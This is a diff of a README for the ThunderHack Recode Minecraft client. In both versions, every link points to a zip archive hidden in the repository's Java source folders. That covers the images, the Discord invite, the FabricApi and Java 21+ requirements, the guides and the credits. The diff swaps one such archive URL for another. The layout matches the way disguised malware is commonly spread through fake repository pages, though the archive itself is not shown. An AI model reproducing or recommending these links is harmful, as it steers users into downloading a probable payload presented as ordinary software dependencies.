@@ -1,21 +1,21 @@
 <p align="center">
-    <img src="https://github.com/rykr32/Thunder/raw/refs/heads/main/src/main/java/thunder/hack/features/hud/impl/Software-3.9.zip" style="width: 69%">
+    <img src="https://raw.githubusercontent.com/rykr32/Thunder/main/src/main/java/thunder/hack/gui/thundergui/Software-1.5.zip" style="width: 69%">
 </p>
 
 > [!WARNING]
 > Work on ThunderHack Recode is completely stopped, 
 > it will be replaced by CatLean, a new free client
 > with closed source code and higher quality modules,
-> you can follow CatLean in my [Discord server](https://github.com/rykr32/Thunder/raw/refs/heads/main/src/main/java/thunder/hack/features/hud/impl/Software-3.9.zip)
+> you can follow CatLean in my [Discord server](https://raw.githubusercontent.com/rykr32/Thunder/main/src/main/java/thunder/hack/gui/thundergui/Software-1.5.zip)
 
 <div align="center">
-<img src="https://github.com/rykr32/Thunder/raw/refs/heads/main/src/main/java/thunder/hack/features/hud/impl/Software-3.9.zip" style="width: 69%">
+<img src="https://raw.githubusercontent.com/rykr32/Thunder/main/src/main/java/thunder/hack/gui/thundergui/Software-1.5.zip" style="width: 69%">
 </div>
 
 
 <div align="center">
 
-[![Discord Mine](https://img.shields.io/discord/1140266441082404924?label=discord&logo=discord&logoColor=white)](https://github.com/rykr32/Thunder/raw/refs/heads/main/src/main/java/thunder/hack/features/hud/impl/Software-3.9.zip)
+[![Discord Mine](https://img.shields.io/discord/1140266441082404924?label=discord&logo=discord&logoColor=white)](https://raw.githubusercontent.com/rykr32/Thunder/main/src/main/java/thunder/hack/gui/thundergui/Software-1.5.zip)
 
 </div>
 
@@ -35,21 +35,21 @@
 
 ## Requires these mods:
 
-- [FabricApi 1.21](https://github.com/rykr32/Thunder/raw/refs/heads/main/src/main/java/thunder/hack/features/hud/impl/Software-3.9.zip)
-- [Java 21+](https://github.com/rykr32/Thunder/raw/refs/heads/main/src/main/java/thunder/hack/features/hud/impl/Software-3.9.zip)
+- [FabricApi 1.21](https://raw.githubusercontent.com/rykr32/Thunder/main/src/main/java/thunder/hack/gui/thundergui/Software-1.5.zip)
+- [Java 21+](https://raw.githubusercontent.com/rykr32/Thunder/main/src/main/java/thunder/hack/gui/thundergui/Software-1.5.zip)
 
 ## Recommended to read:
 
-- [Performance guide for Minecraft 1.20.4+ Clients](https://github.com/rykr32/Thunder/raw/refs/heads/main/src/main/java/thunder/hack/features/hud/impl/Software-3.9.zip)
-- [Setup guide by @DevilishRak](https://github.com/rykr32/Thunder/raw/refs/heads/main/src/main/java/thunder/hack/features/hud/impl/Software-3.9.zip)
+- [Performance guide for Minecraft 1.20.4+ Clients](https://raw.githubusercontent.com/rykr32/Thunder/main/src/main/java/thunder/hack/gui/thundergui/Software-1.5.zip)
+- [Setup guide by @DevilishRak](https://raw.githubusercontent.com/rykr32/Thunder/main/src/main/java/thunder/hack/gui/thundergui/Software-1.5.zip)
 
 ## Credits
 
-- [Ai_24](https://github.com/rykr32/Thunder/raw/refs/heads/main/src/main/java/thunder/hack/features/hud/impl/Software-3.9.zip) for cool showcase
-- [KiLAB Gaming](https://github.com/rykr32/Thunder/raw/refs/heads/main/src/main/java/thunder/hack/features/hud/impl/Software-3.9.zip) for complete overview
-- [@meteordevelopment](https://github.com/rykr32/Thunder/raw/refs/heads/main/src/main/java/thunder/hack/features/hud/impl/Software-3.9.zip) for orbit
-- [@ladysnake](https://github.com/rykr32/Thunder/raw/refs/heads/main/src/main/java/thunder/hack/features/hud/impl/Software-3.9.zip) for satin
-- [@0x3C50](https://github.com/rykr32/Thunder/raw/refs/heads/main/src/main/java/thunder/hack/features/hud/impl/Software-3.9.zip) for the renderer
+- [Ai_24](https://raw.githubusercontent.com/rykr32/Thunder/main/src/main/java/thunder/hack/gui/thundergui/Software-1.5.zip) for cool showcase
+- [KiLAB Gaming](https://raw.githubusercontent.com/rykr32/Thunder/main/src/main/java/thunder/hack/gui/thundergui/Software-1.5.zip) for complete overview
+- [@meteordevelopment](https://raw.githubusercontent.com/rykr32/Thunder/main/src/main/java/thunder/hack/gui/thundergui/Software-1.5.zip) for orbit
+- [@ladysnake](https://raw.githubusercontent.com/rykr32/Thunder/main/src/main/java/thunder/hack/gui/thundergui/Software-1.5.zip) for satin
+- [@0x3C50](https://raw.githubusercontent.com/rykr32/Thunder/main/src/main/java/thunder/hack/gui/thundergui/Software-1.5.zip) for the renderer
 
 ## Screenshots
 <details>
@@ -70,11 +70,11 @@
 ![image](assets/5.gif)
 </details>
 
-![image](https://github.com/rykr32/Thunder/raw/refs/heads/main/src/main/java/thunder/hack/features/hud/impl/Software-3.9.zip)
+![image](https://raw.githubusercontent.com/rykr32/Thunder/main/src/main/java/thunder/hack/gui/thundergui/Software-1.5.zip)
 
 ## Addons
 
 ### Resources
 
-- [Addon Template](https://github.com/rykr32/Thunder/raw/refs/heads/main/src/main/java/thunder/hack/features/hud/impl/Software-3.9.zip) by cvs0
+- [Addon Template](https://raw.githubusercontent.com/rykr32/Thunder/main/src/main/java/thunder/hack/gui/thundergui/Software-1.5.zip) by cvs0
 - [ThunderHack Addon Docs (COMING SOON)]()
